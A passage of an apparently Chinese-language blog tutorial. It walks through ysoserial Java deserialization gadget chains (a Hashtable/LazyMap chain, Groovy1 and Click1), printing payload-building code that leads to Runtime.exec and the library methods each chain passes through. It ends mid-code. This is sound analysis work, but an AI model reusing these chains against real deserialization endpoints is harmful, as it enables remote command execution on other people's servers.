class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Hashtable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[]&#123;command&#125;;</span><br><span class="line">    <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            execArgs),</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建 LazyMap 作为 Hashtable 的元素</span></span><br><span class="line">    Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">    Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">    lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">    lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">    Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    hashtable.put(lazyMap1, <span class="number">1</span>); <span class="comment">// 没有值，直接存</span></span><br><span class="line">    hashtable.put(lazyMap2, <span class="number">2</span>); <span class="comment">// 有值，比较后再存</span></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">    lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用两次 put 方法放入两个 LazyMap</p><ul><li>反序列化时，readObject 实际调用的是 reconstitutionPut</li><li>第一次调用时，会把 key 和 value 注册到 tab 中</li><li>第二次调用时，tab 中有内容则进入 for 循环中，从而调用 equals 方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line"><span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        K key = (K)s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        V value = (V)s.readObject();</span><br><span class="line">    <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">    reconstitutionPut(table, key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashTable#put 在 table 中有元素时会调用 equals 方法，当调用完毕后，lazyMap2 的 key 中就会增加一个键为 yy，值为 UNIXProcess 实例的元素，而 UNIXProcess 没有继承 Serializable，无法序列化，因此需要移除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="keyword">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            V old = entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h2><blockquote><p>Groovy 中使用 <code>&quot;command&quot;.execute()</code> 执行命令<br>用 MethodClosure 承载指令，用于实例化 ConvertedClosure<br>使用 ConvertedClosure 创建 Map 类型代理</p><ul><li>ConvertedClosure 的父类 ConversionHandler 实现 InvocationHandler，并重写了 invoke 方法<br>创建 AnnotationInvocationHandler 代理，在反序列化代理时，会对 memberValues 调用 map.entrySet，进一步调用 ConversionHandler.invoke 方法，实际调用 ConvertedClosure.invokeCustom，最后调用 MethodClosure 父类 Closure.call 方法</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invokeCustom</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (methodName!=<span class="keyword">null</span> &amp;&amp; !methodName.equals(method.getName())) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> ((Closure) getDelegate()).call(args);<span class="comment">//传入的是MethodClosure</span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                ConversionHandler.invoke()</span><br><span class="line">                    ConvertedClosure.invokeCustom()</span><br><span class="line">    MethodClosure.call()</span><br><span class="line">    ...</span><br><span class="line">      Method.invoke()</span><br><span class="line">    Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/A6MvdZRs8qPpF3Y.png" ><p>ysoserial.payloads.Groovy1#getObject 首选利用 MethodClosure 承载要执行的指令，然后构造 ConvertedClosure，再用于实例化 AnnotationInvocationHandler 代理，最后返回的是代理对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// MethodClosure -&gt; 父类 ConversionHandler.delegate</span></span><br><span class="line">    <span class="comment">// &quot;entrySet&quot; -&gt; ConvertedClosure.methodName</span></span><br><span class="line"><span class="keyword">final</span> ConvertedClosure closure = <span class="keyword">new</span> ConvertedClosure(<span class="keyword">new</span> MethodClosure(command, <span class="string">&quot;execute&quot;</span>), <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 ConvertedClosure 创建 Map 类型的代理对象</span></span><br><span class="line"><span class="keyword">final</span> Map map = Gadgets.createProxy(closure, Map.class);</span><br><span class="line">    <span class="comment">// 利用反射机制创建 AnnotationInvocationHandler 代理，将 map 保存到 memberValues 属性中</span></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Click1"><a href="#Click1" class="headerlink" title="Click1"></a>Click1</h2><blockquote><p>Web 应用框架<br>和 CC2 类似思路</p><ul><li>利用 TemplatesImpl 承载恶意调用链</li><li>PriorityQueue 在反序列化时比较元素（恢复顺序），而比较操作可以自定义<br>这里使用 Column$ColumnComparator#compare 方法</li></ul></blockquote><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">      PriorityQueue.heapify()</span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">          PriorityQueue.siftDownUsingComparator()</span><br><span class="line">            Column$ColumnComparator.compare()</span><br><span class="line">                Column.getProperty()</span><br><span class="line">                  PropertyUtils.getValue()</span><br><span class="line">                    PropertyUtils.getObjectPropertyValue()</span><br><span class="line">                      Method.invoke()</span><br><span class="line">                        TemplatesImpl.getOutputProperties()</span><br><span class="line">                        ...</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/dpkRxuNwU34JQzn.png" ><p>TemplatesImpl 类主要的作用为：</p><ul><li>使用 <code>_bytecodes</code> 成员变量存储恶意字节码 ( 恶意 class -&gt; byte array )</li><li>提供加载恶意字节码并触发执行的函数，加载在 <code>defineTransletClasses()</code> 方法中，方法触发为 <code>getOutputProperties()</code> 或 <code>newTransformer()</code></li></ul><p>PriorityQueue 反序列化时最后会调用 <code>heapify -&gt; siftDown</code>（将无序队列还原为优先队列），当 comparator 不为空时进一步调用 <code>siftDownUsingComparator -&gt; conparator.compare</code>，然后通过调用 Column.getProperty 进一步触发 TemplatesImpl.getOutputProperties</p><p>ysoserial.payloads.Click1#getObject 创建 Column$ColumnComparator 比较器，作为 PriorityQueue 的参数；先设置正常的变量值，然后设置 Column 的 name 变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// prepare a Column.comparator with mock values</span></span><br><span class="line">    <span class="keyword">final</span> Column column = <span class="keyword">new</span> Column(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line">    column.setTable(<span class="keyword">new</span> Table());</span><br><span class="line">    Comparator comparator = (Comparator) Reflections.newInstance(<span class="string">&quot;org.apache.click.control.Column$ColumnComparator&quot;</span>, column);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// create queue with numbers and our comparator</span></span><br><span class="line">    <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// stub data for replacement later</span></span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// switch method called by the comparator,</span></span><br><span class="line">    <span class="comment">// so it will trigger getOutputProperties() when objects in the queue are compared</span></span><br><span class="line">    column.setName(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// finally, we inject and new TemplatesImpl object into the queue,</span></span><br><span class="line">    <span class="comment">// so its getOutputProperties() method will be called</span></span><br><span class="line">    <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">    queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Column$ColumnComparator.compare 方法，其中 row1 为恶意 TemplatesImpl 对象，row2 为 <code>BigInteger(&quot;1&quot;)</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object row1, Object row2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.ascendingSort = <span class="keyword">this</span>.column.getTable().isSortedAscending() ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    Object value1 = <span class="keyword">this</span>.column.getProperty(row1); <span class="comment">// 这里</span></span><br><span class="line">    Object value2 = <span class="keyword">this</span>.column.getProperty(row2);</span><br><span class="line">    <span class="keyword">if</span> (value1 <span class="keyword">instanceof</span> Comparable &amp;&amp; value2 <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">        <span class="keyword">return</span> !(value1 <span class="keyword">instanceof</span> String) &amp;&amp; !(value2 <span class="keyword">instanceof</span> String) ? ((Comparable)value1).compareTo(value2) * <span class="keyword">this</span>.ascendingSort : <span class="keyword">this</span>.stringCompare(value1, value2) * <span class="keyword">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value1 != <span class="keyword">null</span> &amp;&amp; value2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value1.toString().compareToIgnoreCase(value2.toString()) * <span class="keyword">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value1 != <span class="keyword">null</span> &amp;&amp; value2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> * <span class="keyword">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value1 == <span class="keyword">null</span> &amp;&amp; value2 != <span class="keyword">null</span> ? -<span class="number">1</span> * <span class="keyword">this</span>.ascendingSort : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用 this.column.getProperty(row1)，其中，调用 this.getName() 获取 Column 的 name 属性，并调用 this.getProperty(name, row)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(Object row)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getProperty(<span class="keyword">this</span>.getName(), row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为传入的 TemplatesImpl 对象不是 Map 的子类，直接跳过 if 判断，在为 methodCache 属性初始化 HashMap 类型对象后，调用 PropertyUtils.getValue(row, name, this.methodCache) 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(String name, Object row)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (row <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        Map map = (Map)row;</span><br><span class="line">        Object object = map.get(name);</span><br><span class="line">        <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String upperCaseName = name.toUpperCase();</span><br><span class="line">            object = map.get(upperCaseName);</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String lowerCaseName = name.toLowerCase();</span><br><span class="line">                object = map.get(lowerCaseName);</span><br><span class="line">                <span class="keyword">return</span> object != <span class="keyword">null</span> ? object : <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 直接执行这里</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.methodCache == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.methodCache = <span class="keyword">new</span> HashMap();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> PropertyUtils.getValue(row, name, <span class="keyword">this</span>.methodCache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将传入的 name 参数值赋给 basePart 变量，并在调用 getObjectPropertyValue 方法时作为参数传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getValue</span><span class="params">(Object source, String name, Map cache)</span> </span>&#123;</span><br><span class="line">    String basePart = name;</span><br><span class="line">    String remainingPart = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (source <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Map)source).get(name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> baseIndex = name.indexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (baseIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">            basePart = name.substring(<span class="number">0</span>, baseIndex);</span><br><span class="line">            remainingPart = name.substring(baseIndex + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        Object value = getObjectPropertyValue(source, basePart, cache);  # 这里</span><br><span class="line">        <span class="keyword">return</span> remainingPart != <span class="keyword">null</span> &amp;&amp; value != <span class="keyword">null</span> ? getValue(value, remainingPart, cache) : value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cache 是初始化的 HashMap 对象，所以从中获取不到任何缓存方法，因此会调用 source.getClass().getMethod(ClickUtils.toGetterName(name)) 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">getObjectPropertyValue</span><span class="params">(Object source, String name, Map cache)</span> </span>&#123;</span><br><span class="line">    PropertyUtils.CacheKey methodNameKey = <span class="keyword">new</span> PropertyUtils.CacheKey(source, name);</span><br><span class="line">    Method method = <span class="keyword">null</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        method = (Method)cache.get(methodNameKey);</span><br><span class="line">        <span class="keyword">if</span> (method == <span class="keyword">null</span>) &#123;</span><br><span class="line">            method = source.getClass().getMethod(ClickUtils.toGetterName(name));    <span class="comment">// 这里</span></span><br><span class="line">            cache.put(methodNameKey, method);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var13) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method = source.getClass().getMethod(ClickUtils.toIsGetterName(name));</span><br><span class="line">            cache.put(methodNameKey, method);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var11) &#123;</span><br><span class="line">            String msg;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = source.getClass().getMethod(name);</span><br><span class="line">                cache.put(methodNameKey, method);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var9) &#123;</span><br><span class="line">                msg = <span class="string">&quot;No matching getter method found for property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on class &quot;</span> + source.getClass().getName();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg, var10);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">            String msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg, var12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">        String msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg, var14);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法是为传入的 property 属性头部添加 <code>get</code> 三个字符再返回，因此回到 getObjectPropertyValue 方法中调用method.invoke(source) 方法时，method 参数值对应的是 “get” + 传入的 name 变量。</p><p>而这里 name 变量值是由 Column#name 属性值决定的，因此控制 Column#name 属性值就可以调用任意类中以 <code>get</code> 开头的无参方法。可以直接通过构造函数控制 Column#name 属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toGetterName</span><span class="params">(String property)</span> </span>&#123;</span><br><span class="line">    HtmlStringBuffer buffer = <span class="keyword">new</span> HtmlStringBuffer(property.length() + <span 